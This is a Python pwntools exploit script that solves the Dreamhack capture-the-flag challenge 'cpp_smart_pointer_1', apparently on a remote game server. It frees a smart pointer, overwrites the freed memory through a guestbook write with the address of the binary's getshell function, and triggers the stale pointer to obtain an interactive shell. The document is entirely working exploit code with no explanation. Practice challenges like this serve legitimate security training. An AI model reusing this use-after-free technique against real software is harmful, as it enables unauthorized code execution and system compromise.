#!/usr/bin/env python3

from pwn import *

exe = ELF("./cpp_smart_pointer_1")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 12594)

    return r


def main():
    r = conn()

    r.sendlineafter(b"select : ", b"2")
    r.sendlineafter(b"Select pointer(1, 2): ", b"1")

    r.sendlineafter(b"select : ", b"4")
    r.sendlineafter(b"write guestbook : ", b"DUMMY")

    r.sendlineafter(b"select : ", b"4")
    r.sendlineafter(b"write guestbook : ", p64(exe.symbols["_Z8getshellv"]))

    r.sendlineafter(b"select : ", b"3")
    r.sendlineafter(b"Select pointer(1, 2): ", b"2")

    r.interactive()


if __name__ == "__main__":
    main()